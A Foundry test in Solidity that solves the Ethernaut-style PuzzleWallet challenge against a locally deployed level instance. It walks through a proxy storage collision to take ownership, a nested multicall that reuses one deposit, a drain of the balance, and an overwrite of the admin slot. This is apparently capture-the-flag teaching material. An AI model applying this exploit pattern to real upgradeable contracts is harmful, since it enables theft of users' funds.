// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {IPuzzleWallet, IPuzzleWalletProxy} from "src/hack/interfaces/IPuzzleWallet.sol";
import {PuzzleWalletFactory} from "src/levels/PuzzleWalletFactory.sol";

contract PuzzleWalletHackTest is Test {
    address private attacker = makeAddr("attacker");
    address private deployer = makeAddr("deployer");
    PuzzleWalletFactory private factory;
    IPuzzleWallet private puzzleWallet;
    IPuzzleWalletProxy private proxy;

    function setUp() external {
        vm.prank(deployer, deployer);
        factory = new PuzzleWalletFactory();

        hoax(attacker, attacker, 1 ether);
        address puzzleWalletProxyAddress = factory.createInstance{
            value: 0.001 ether
        }(attacker);

        puzzleWallet = IPuzzleWallet(puzzleWalletProxyAddress);
        proxy = IPuzzleWalletProxy(puzzleWalletProxyAddress);
    }

    function test_PuzzleWalletHack() external {
        vm.startPrank(attacker, attacker);

        // propose attacker as new admin
        // this will set owner variable of PuzzleWallet to attacker address
        proxy.proposeNewAdmin(attacker);

        assertEq(proxy.pendingAdmin(), attacker, "Failed To Propose New Admin");

        // whitelist attacker address using proxy delegatecall
        (bool success, ) = address(proxy).call(
            abi.encodeWithSelector(
                IPuzzleWallet.addToWhitelist.selector,
                attacker
            )
        );

        assertTrue(success, "Call to addToWhitelist Failed!!!");

        assertTrue(
            puzzleWallet.whitelisted(attacker),
            "Failed To Whitelist The Address"
        );

        // call multicall passing call data for deposit and multicall
        // inside inner multicall pass call data for execute
        bytes[] memory depositCall = new bytes[](1);
        depositCall[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(
            IPuzzleWallet.multicall.selector,
            depositCall
        );

        (success, ) = address(proxy).call{value: 0.001 ether}(
            abi.encodeWithSelector(IPuzzleWallet.multicall.selector, calls)
        );
        assertTrue(success, "Call to multicall Failed!!!");
        console.log("multicall executed");

        // call execute to drain the balance
        (success, ) = address(proxy).call(
            abi.encodeWithSelector(
                IPuzzleWallet.execute.selector,
                attacker,
                0.002 ether,
                ""
            )
        );
        assertTrue(success, "Call to execute Failed!!!");
        assertTrue(
            address(puzzleWallet).balance == 0,
            "Failed to drain the balance"
        );

        // set maxBalance as your address
        (success, ) = address(proxy).call(
            abi.encodeWithSelector(
                IPuzzleWallet.setMaxBalance.selector,
                uint160(attacker)
            )
        );
        assertTrue(success, "Call to setMaxBalance Failed!!!");
        assertTrue(
            puzzleWallet.owner() == attacker,
            "Failed to set attacker as owner"
        );

        success = factory.validateInstance(payable(address(proxy)), attacker);
        assertTrue(success, "Failed To Validate The Instance");

        vm.stopPrank();
    }
}
